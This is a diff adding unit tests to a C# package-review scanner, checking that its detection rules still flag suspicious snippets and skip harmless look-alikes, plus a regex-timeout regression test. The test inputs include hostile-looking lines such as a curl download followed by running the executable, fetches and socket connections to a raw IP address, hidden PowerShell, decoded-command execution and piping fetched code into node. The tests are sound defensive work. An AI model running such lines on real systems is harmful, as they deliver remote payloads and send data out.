@@ -149,6 +149,44 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("background process", StringComparison.Ordinal));
     }
 
+    private static IEnumerable<string> Details(string text, bool install = false) =>
+        PackageReview.Scan("index.js", text, install, default, peel: false).Select(f => f.Detail);
+
+    [Fact]
+    public void Rules_that_took_lookarounds_or_a_backreference_find_what_they_found_before()
+    {
+        Assert.Contains(Details("eval( code)"), d => d.Contains("(eval / Function)", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details("eval('1+1')"), d => d.Contains("(eval / Function)", StringComparison.Ordinal));
+        Assert.Contains(Details("x;exec(atob(s))"), d => d == "runs a decoded command");
+        Assert.DoesNotContain(Details("cp.exec(atob(s))"), d => d == "runs a decoded command");
+        Assert.Contains(Details("system('whoami /all')"), d => d.StartsWith("runs account", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details("os.system('whoami /all')"), d => d.StartsWith("runs account", StringComparison.Ordinal));
+        Assert.Contains(Details("fetch('http://203.0.113.9:8080/c')"), d => d == "sends to a raw address");
+        Assert.DoesNotContain(Details("fetch('http://192.168.1.9/c')"), d => d == "sends to a raw address");
+        Assert.Contains(Details("s.connect(('203.0.113.9', 443))"), d => d == "opens a socket to a raw address");
+        Assert.DoesNotContain(Details("s.connect(('127.0.0.1', 443))"), d => d == "opens a socket to a raw address");
+        Assert.Contains(Details("powershell -w hidden -c x"), d => d.StartsWith("runs a hidden", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details("powershell -w hidden -Verb runAs"), d => d.StartsWith("runs a hidden", StringComparison.Ordinal));
+        Assert.Contains(Details("curl -o a.exe https://h.example/a\nstart a.exe"), d => d == "downloads a program to a file and starts it");
+        Assert.DoesNotContain(Details("curl -o a.exe https://h.example/a\nstart b.exe"), d => d == "downloads a program to a file and starts it");
+        Assert.Contains(Details(string.Join(";", Enumerable.Range(0, 9).Select(i => $"_0x{i}a2b"))), d => d.StartsWith("obfuscator.io", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details(string.Join(";\n", Enumerable.Range(0, 9).Select(i => $"_0x{i}a2b"))), d => d.StartsWith("obfuscator.io", StringComparison.Ordinal));
+        Assert.Contains(Details("const p = spawn('node'); p.stdin.write(await fetch(u))"), d => d.StartsWith("runs code it fetches", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details("const p = spawn('node'); await fetch(u); p.stdin.write('1')"), d => d.StartsWith("runs code it fetches", StringComparison.Ordinal));
+        Assert.Contains(Details("exec(compile(src, 'x', 'exec'))", install: true), d => d.Contains("eval(compile", StringComparison.Ordinal));
+        Assert.DoesNotContain(Details("exec(compile(f.read(), 'x', 'exec'))", install: true), d => d.Contains("eval(compile", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_rule_reads_to_the_end_of_a_bundle_that_backtracked_past_the_match_timeout()
+    {
+        // Regression: macOS CI on 08f2735f threw RegexMatchTimeoutException from the package view.
+        // Eight names close together, then a gap, over 4 MB of one line: nested bounded gaps backtracked combinatorially.
+        var names = string.Concat(Enumerable.Range(0, 8).Select(i => $"_0x{i}a2b ")) + new string(' ', 401);
+        var bundle = string.Concat(Enumerable.Repeat(names, (4 << 20) / names.Length)) + names.TrimEnd() + " _0x9a2b";
+        Assert.Contains(Details(bundle), d => d.StartsWith("obfuscator.io", StringComparison.Ordinal));
+    }
+
     [Fact]
     public void Code_after_hundreds_of_spaces_on_a_line_is_noteworthy()
     {
